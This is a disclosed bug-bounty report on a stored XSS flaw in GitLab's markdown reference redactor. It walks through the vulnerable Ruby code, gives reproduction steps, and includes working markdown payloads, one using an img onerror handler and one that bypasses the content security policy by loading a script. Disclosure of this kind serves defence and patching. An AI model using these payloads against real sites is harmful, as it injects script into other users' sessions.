# Stored XSS in markdown when redacting references

## Report Details
- **Report ID**: 836649
- **URL**: https://hackerone.com/reports/836649
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-01T22:46:10.314Z
- **Disclosed**: 2020-09-09T21:58:37.456Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the `data-original` attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:

```ruby
    def redacted_node_content(node)
      original_content = node.attr('data-original')
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if
      # it's originally a link pattern. We shouldn't return a plain text href.
      original_link =
        if link_reference == 'true'
          href = node.attr('href')
          content = original_content

          %(<a href="#{href}">#{content}</a>)
        end

      # The reference should be replaced by the original link's content,
      # which is not always the same as the rendered one.
      original_link || original_content || node.inner_html
    end
```

### Steps to reproduce
1. create a private project with one account
1. create an issue in the private project
1. sign into another account that does not have permission to read the above project
1. comment on an issue linking to the private issue using the following:

    ```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
    ```
1. The rendered markdown contains the injected html:

    ```html
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
    ```

The above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
&lt;a 
  data-remote=&quot;true&quot;
  data-method=&quot;get&quot;
  data-type=&quot;script&quot;
  href=/wbowling/wiki/raw/master/test.js
  class='atwho-view select2-drop-mask pika-select'
&gt;
  &lt;img height=10000 width=10000&gt;
&lt;/a&gt;
</a>
```

which generates the following html:
```html
<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp
</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">
<img height="10000" width="10000">
</a>
</p></div>
```

### Impact
Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

### Examples
* example payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1
* with csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2

### What is the current *bug* behavior?
The `data-original` attribute can be abused to inject arbitrary html when a reference is redacted.

### What is the expected *correct* behavior?
The `data-original` should be double encoded or filtered before being reused.

### Relevant logs and/or screenshots
{F769570}

### Output of checks
Happens on gitlab.com

#### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.2-ee
Revision:	0ad76f4d374
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

## Attachments
- Screen_Shot_2020-04-02_at_9.44.33_am.png
